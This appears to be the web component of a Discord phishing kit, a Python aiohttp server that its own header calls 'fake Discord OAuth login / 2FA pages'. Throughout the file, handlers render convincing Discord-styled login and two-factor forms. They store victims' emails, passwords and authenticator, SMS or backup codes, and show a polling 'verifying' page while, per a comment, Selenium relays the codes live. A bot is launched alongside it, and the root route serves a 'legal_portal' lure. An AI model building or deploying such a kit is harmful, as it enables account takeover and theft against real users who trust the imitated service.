# web.py
# Aiohttp web server that serves the fake Discord OAuth login / 2FA pages.
# Runs alongside the bot in a separate thread.

import json
import os
import sys
import asyncio
import threading
from aiohttp import web

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utils import oauth_store

# ──────────────────────────────────────────────────────────────────────────────
# Shared CSS / Discord SVG logo embedded in every page
# ──────────────────────────────────────────────────────────────────────────────

_BASE_CSS = """
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #313338;
      color: #dbdee1;
      font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: #1e1f22;
      border-radius: 8px;
      padding: 32px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
    }
    .logo { display: flex; justify-content: center; margin-bottom: 24px; }
    .logo svg { width: 48px; height: 48px; fill: #5865f2; }
    h1 { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #f2f3f5; }
    .subtitle { font-size: 16px; color: #b5bac1; text-align: center; margin-bottom: 20px; }
    label {
      display: block; font-size: 12px; font-weight: 700;
      letter-spacing: .02em; text-transform: uppercase;
      color: #b5bac1; margin-bottom: 8px; margin-top: 16px;
    }
    label span { color: #f23f43; }
    input[type="text"], input[type="password"], input[type="number"] {
      width: 100%; padding: 10px; background: #111214;
      border: 1px solid #1e1f22; border-radius: 4px;
      color: #dbdee1; font-size: 16px; outline: none;
    }
    input:focus { border-color: #5865f2; }
    .btn {
      display: block; width: 100%; margin-top: 20px; padding: 14px;
      background: #5865f2; color: #fff; font-size: 16px; font-weight: 600;
      border: none; border-radius: 4px; cursor: pointer;
      transition: background .17s ease;
    }
    .btn:hover { background: #4752c4; }
    .btn:disabled { background: #3c44a3; cursor: not-allowed; opacity: .7; }
    .divider {
      display: flex; align-items: center; gap: 12px;
      margin: 20px 0 8px; color: #4e5058;
      font-size: 12px; font-weight: 600; text-transform: uppercase;
    }
    .divider::before, .divider::after {
      content: ""; flex: 1; height: 1px; background: #3f4147;
    }
    .footer { margin-top: 16px; font-size: 14px; color: #949ba4; text-align: center; }
    .footer a { color: #00a8fc; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    .alert {
      padding: 10px 14px; border-radius: 4px;
      font-size: 14px; margin-bottom: 16px;
    }
    .alert-error { background: #f23f43; color: #fff; }
    .alert-info  { background: #5865f2; color: #fff; }
    /* radio method buttons */
    .methods { display: flex; flex-direction: column; gap: 8px; margin-top: 16px; }
    .method-btn {
      display: flex; align-items: center; gap: 12px;
      background: #2b2d31; border: 2px solid #3f4147;
      border-radius: 6px; padding: 12px 14px; cursor: pointer;
      transition: border-color .15s ease;
    }
    .method-btn input[type="radio"] { accent-color: #5865f2; width: 18px; height: 18px; }
    .method-btn:has(input:checked) { border-color: #5865f2; background: #262835; }
    .method-label { font-size: 15px; font-weight: 600; color: #f2f3f5; }
    .method-desc  { font-size: 12px; color: #949ba4; margin-top: 2px; }
    /* spinner */
    .spinner-wrap { display: flex; flex-direction: column; align-items: center; gap: 20px; padding: 12px 0; }
    .spinner {
      width: 48px; height: 48px; border: 4px solid #3f4147;
      border-top-color: #5865f2; border-radius: 50%;
      animation: spin 0.9s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner-msg { color: #b5bac1; font-size: 15px; text-align: center; }
"""

_DISCORD_LOGO = """
    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.08.112 18.1.13 18.116a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
    </svg>
"""


def _page(title: str, body: str, head_extra: str = "") -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{title}</title>
  <style>{_BASE_CSS}</style>
  {head_extra}
</head>
<body>
  <div class="card">
    <div class="logo">{_DISCORD_LOGO}</div>
    {body}
  </div>
</body>
</html>"""


# ──────────────────────────────────────────────────────────────────────────────
# Login page
# ──────────────────────────────────────────────────────────────────────────────

def _login_html(error: str = "") -> str:
    alert = (
        f'<div class="alert alert-error">{error}</div>'
        if error else ""
    )
    return _page(
        "Discord – Login",
        f"""
        <h1>Welcome back!</h1>
        <p class="subtitle">We're so excited to see you again!</p>
        {alert}
        <form method="POST">
          <label>Email or Phone Number <span>*</span></label>
          <input type="text" name="email" autocomplete="email" required autofocus>
          <label>Password <span>*</span></label>
          <input type="password" name="password" autocomplete="current-password" required>
          <button class="btn" type="submit">Log In</button>
        </form>
        <div class="divider">or</div>
        <div class="footer">Need an account? <a href="#">Register</a></div>
        """,
    )


# ──────────────────────────────────────────────────────────────────────────────
# Verifying page  (shown immediately after credentials are submitted)
# Polls /oauth/{page_id}/status via JS and redirects appropriately.
# ──────────────────────────────────────────────────────────────────────────────

def _verifying_html(page_id: str) -> str:
    script = f"""
<script>
  const PAGE_ID = {json.dumps(page_id)};
  let consecutive_errors = 0;

  async function poll() {{
    try {{
      const r = await fetch('/oauth/' + PAGE_ID + '/status');
      if (!r.ok) {{ scheduleNext(); return; }}
      const d = await r.json();
      const status = d.status || '';

      if (status === '2fa_required') {{
        let dest = '/oauth/' + PAGE_ID + '/2fa';
        if (d.error) dest += '?error=' + encodeURIComponent(d.error);
        window.location.href = dest;
        return;
      }}
      if (status === 'done') {{
        document.getElementById('spinner-msg').textContent =
          '✔ Authorisation complete. You may close this tab.';
        document.querySelector('.spinner').style.display = 'none';
        return;
      }}
      if (status === 'failed') {{
        document.getElementById('spinner-msg').innerHTML =
          '❌ Login failed. The credentials may be incorrect or your account is protected.';
        document.querySelector('.spinner').style.display = 'none';
        return;
      }}
      if (status === 'unknown') {{
        // Session was removed before the browser could read a terminal status.
        // Treat this as a failed/expired session so we stop polling.
        document.getElementById('spinner-msg').innerHTML =
          '❌ Session expired or login failed.';
        document.querySelector('.spinner').style.display = 'none';
        return;
      }}
      scheduleNext();
    }} catch (e) {{
      if (++consecutive_errors < 5) scheduleNext();
    }}
  }}

  function scheduleNext() {{ setTimeout(poll, 1500); }}
  poll();
</script>
"""
    return _page(
        "Discord – Verifying",
        """
        <h1>Verifying</h1>
        <p class="subtitle">Please wait while we verify your credentials&hellip;</p>
        <div class="spinner-wrap">
          <div class="spinner"></div>
          <p class="spinner-msg" id="spinner-msg">This usually takes a few seconds.</p>
        </div>
        """,
        head_extra=script,
    )


# ──────────────────────────────────────────────────────────────────────────────
# 2FA page
# ──────────────────────────────────────────────────────────────────────────────

_METHOD_META: dict[str, tuple[str, str]] = {
    "totp":   ("Authenticator App", "Enter the 6-digit code from your authenticator app."),
    "sms":    ("SMS",               "Enter the 6-digit code sent to your phone number."),
    "backup": ("Backup Code",       "Enter one of your 8-character emergency backup codes."),
}


def _2fa_html(page_id: str, types: list[str], error: str = "") -> str:
    alert = (
        f'<div class="alert alert-error">{error}</div>'
        if error else ""
    )

    methods_html = ""
    for i, t in enumerate(types):
        name, desc = _METHOD_META.get(t, (t, ""))
        checked = "checked" if i == 0 else ""
        methods_html += f"""
        <label class="method-btn">
          <input type="radio" name="method" value="{t}" {checked}>
          <div>
            <div class="method-label">{name}</div>
            <div class="method-desc">{desc}</div>
          </div>
        </label>"""

    # Code input label adapts based on first selected method
    first_type = types[0] if types else "totp"
    first_label = _METHOD_META.get(first_type, ("Code", ""))[0]

    script = """
<script>
  const radios = document.querySelectorAll('input[name="method"]');
  const codeLabel = document.getElementById('code-label');
  const codeInput = document.getElementById('code-input');

  const meta = {
    totp:   { label: 'Authenticator Code', placeholder: '6-digit code', maxlen: 6, pattern: '[0-9]{6}' },
    sms:    { label: 'SMS Code',           placeholder: '6-digit code', maxlen: 6, pattern: '[0-9]{6}' },
    backup: { label: 'Backup Code',        placeholder: '8-character backup code', maxlen: 8, pattern: '[a-zA-Z0-9]{8}' },
  };

  function updateInputForMethod(method) {
    const m = meta[method] || meta.totp;
    codeLabel.textContent = m.label + ' *';
    codeInput.placeholder = m.placeholder;
    codeInput.maxLength   = m.maxlen;
    codeInput.pattern     = m.pattern;
    codeInput.value       = '';
    codeInput.focus();
  }

  radios.forEach(r => r.addEventListener('change', () => updateInputForMethod(r.value)));
</script>
"""

    return _page(
        "Discord – Two-Factor Authentication",
        f"""
        <h1>Two-Factor Authentication</h1>
        <p class="subtitle">Choose a verification method to continue.</p>
        {alert}
        <form method="POST">
          <div class="methods">{methods_html}</div>
          <label id="code-label">
            {first_label} Code <span>*</span>
          </label>
          <input id="code-input" type="text" name="code"
                 autocomplete="one-time-code" required autofocus
                 placeholder="6-digit code" maxlength="6">
          <button class="btn" type="submit">Verify</button>
        </form>
        """,
        head_extra=script,
    )


# ──────────────────────────────────────────────────────────────────────────────
# Success / generic pages
# ──────────────────────────────────────────────────────────────────────────────

_NOT_FOUND_HTML = _page(
    "Discord – Not Found",
    """<h1 style="color:#f23f43">Not Found</h1>
    <p class="subtitle" style="margin-top:8px">
      This link has expired or is invalid.
    </p>""",
)


# ──────────────────────────────────────────────────────────────────────────────
# Route handlers
# ──────────────────────────────────────────────────────────────────────────────

async def handle_root(request: web.Request) -> web.Response:
    try:
        src_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(src_dir, "templates", "legal_portal.html")) as f:
            html = f.read()
        return web.Response(text=html, content_type="text/html")
    except FileNotFoundError:
        return web.Response(text="OK", content_type="text/plain")


async def handle_oauth_get(request: web.Request) -> web.Response:
    page_id = request.match_info["page_id"]
    if not oauth_store.get_discord_user_id(page_id):
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)
    return web.Response(text=_login_html(), content_type="text/html")


async def handle_oauth_post(request: web.Request) -> web.Response:
    page_id = request.match_info["page_id"]
    if not oauth_store.get_discord_user_id(page_id):
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)

    data = await request.post()
    email = str(data.get("email", "")).strip()
    password = str(data.get("password", "")).strip()

    if not email or not password:
        return web.Response(
            text=_login_html("Please fill in all fields."),
            content_type="text/html",
        )

    stored = oauth_store.store_credentials(page_id, email, password)
    if not stored:
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)

    # Show the polling "verifying" page instead of an immediate success page
    return web.Response(text=_verifying_html(page_id), content_type="text/html")


async def handle_status(request: web.Request) -> web.Response:
    """JSON polling endpoint used by the verifying and 2FA pages."""
    page_id = request.match_info["page_id"]
    status = oauth_store.get_status(page_id)
    payload: dict = {"status": status}

    if status == "2fa_required":
        payload["types"] = oauth_store.get_2fa_types(page_id)
        err = oauth_store.pop_2fa_error(page_id)
        if err:
            payload["error"] = err

    return web.Response(
        text=json.dumps(payload),
        content_type="application/json",
    )


async def handle_2fa_get(request: web.Request) -> web.Response:
    page_id = request.match_info["page_id"]
    status = oauth_store.get_status(page_id)

    if status != "2fa_required":
        # Not in 2FA state — redirect back to the verifying page
        raise web.HTTPFound(f"/oauth/{page_id}/verifying")

    types = oauth_store.get_2fa_types(page_id)
    if not types:
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)

    # Error message is passed as a query param by the verifying page when a wrong
    # code was detected (e.g. ?error=Incorrect+code.+Please+try+again.)
    error = request.rel_url.query.get("error", "")
    return web.Response(text=_2fa_html(page_id, types, error), content_type="text/html")


async def handle_2fa_post(request: web.Request) -> web.Response:
    page_id = request.match_info["page_id"]
    if oauth_store.get_status(page_id) != "2fa_required":
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)

    types = oauth_store.get_2fa_types(page_id)
    data = await request.post()
    code = str(data.get("code", "")).strip()
    method = str(data.get("method", types[0] if types else "totp")).strip()

    if not code:
        return web.Response(
            text=_2fa_html(page_id, types, "Please enter your verification code."),
            content_type="text/html",
        )

    if method not in types:
        return web.Response(
            text=_2fa_html(page_id, types, "Invalid verification method selected."),
            content_type="text/html",
        )

    stored = oauth_store.store_2fa_code(page_id, code, method)
    if not stored:
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)

    # Show the verifying page again so the user sees progress while Selenium submits
    return web.Response(text=_verifying_html(page_id), content_type="text/html")


async def handle_verifying_get(request: web.Request) -> web.Response:
    """Explicit GET for the verifying page (e.g., redirected back here)."""
    page_id = request.match_info["page_id"]
    if not oauth_store.get_discord_user_id(page_id):
        return web.Response(text=_NOT_FOUND_HTML, content_type="text/html", status=404)
    return web.Response(text=_verifying_html(page_id), content_type="text/html")


# ──────────────────────────────────────────────────────────────────────────────
# Server entry point
# ──────────────────────────────────────────────────────────────────────────────

def _run_webserver() -> None:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    app = web.Application()
    app.router.add_get("/",                              handle_root)
    app.router.add_get( "/oauth/{page_id}",              handle_oauth_get)
    app.router.add_post("/oauth/{page_id}",              handle_oauth_post)
    app.router.add_get( "/oauth/{page_id}/status",       handle_status)
    app.router.add_get( "/oauth/{page_id}/2fa",          handle_2fa_get)
    app.router.add_post("/oauth/{page_id}/2fa",          handle_2fa_post)
    app.router.add_get( "/oauth/{page_id}/verifying",    handle_verifying_get)

    web.run_app(app, host="0.0.0.0", port=5000, handle_signals=False)


def run_bot() -> None:
    os.system("python3 src/bot.py")


if __name__ == "__main__":
    web_thread = threading.Thread(target=_run_webserver, daemon=True)
    bot_thread = threading.Thread(target=run_bot)
    web_thread.start()
    bot_thread.start()
    bot_thread.join()
